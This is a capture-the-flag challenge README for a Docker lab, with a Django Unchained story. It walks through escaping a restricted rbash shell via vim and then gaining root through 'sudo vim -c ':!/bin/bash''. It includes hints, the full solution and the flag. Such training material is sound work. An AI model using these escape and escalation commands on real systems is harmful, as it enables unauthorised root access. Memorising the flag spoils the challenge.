# Challenge 3  Restricted Shell Escape + Sudo

**Difficulty:** Hard
**Category:** Linux Privilege Escalation / Shell Escape
**Flag:** `/root/flag.txt`

---

## Story

You are **Django**. You made it through the gates  but Candie's men put you in chains.
Your shell is restricted. You can barely move. A few tools are on the table in front of you.

Schultz once told you: *"Every man has a weakness. Find it."*

Break out of the restricted shell, then finish the job.

---

## Setup

```bash
docker build -t ctf-linux-hard-3 .
docker run -it --rm ctf-linux-hard-3
```

Credentials: `django` / `freedom`

You will land in `rbash`  a restricted Bash shell.

---

## Background: rbash (Restricted Bash)

`rbash` is Bash started with the `-r` flag. It blocks:
- Changing `PATH` or `SHELL`
- Using `/` in command names (you can't run `/bin/bash` directly)
- Output redirection (`>`, `>>`)
- `cd`

However, `rbash` cannot restrict what happens **inside** programs you are allowed to run.
If any available tool can spawn a shell or run a command, it becomes your escape hatch.

This is a two-stage challenge:
1. Escape `rbash` into a full unrestricted shell
2. Use the unrestricted shell to escalate to root

---

## Hints

<details>
<summary>Hint 1</summary>
List what commands are available to you:

```bash
ls ~/bin
```

Think about which of these tools can execute arbitrary commands or spawn a shell.
Check GTFOBins for each one.
</details>

<details>
<summary>Hint 2  Escaping rbash via vim</summary>
Vim can execute shell commands. From inside vim:

```
:set shell=/bin/bash
:shell
```

This drops you into a full unrestricted bash shell.
</details>

<details>
<summary>Hint 3  Escalating to root</summary>
Once you have a full shell, check sudo:

```bash
sudo -l
```

You already know what to do with `sudo vim`.
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Stage 1  Escape rbash via vim

```bash
vim
```

Inside vim, run:
```
:set shell=/bin/bash
:shell
```

You now have an unrestricted bash shell as `django`.

Verify:
```bash
echo $SHELL
/bin/bash
```

### Stage 2  Escalate to root via sudo vim

```bash
sudo vim -c ':!/bin/bash'
```

You are now root.

### Stage 3  Read the flag

```bash
cat /root/flag.txt
```

```
CTF{n04m_unch41n3d_dj4ng0_br0k3_fr33}
```

### Why this works

`rbash` is a security control  not a security boundary. It is designed to limit
accidental mistakes by regular users, not to contain a motivated attacker. Any
tool that can spawn a subprocess or change the shell variable defeats it. Real
hardened environments use more robust mechanisms: restricted accounts with only
specific binaries accessible, no interactive shell at all, or containerized
execution environments. `rbash` alone should never be treated as a security guarantee.

</details>
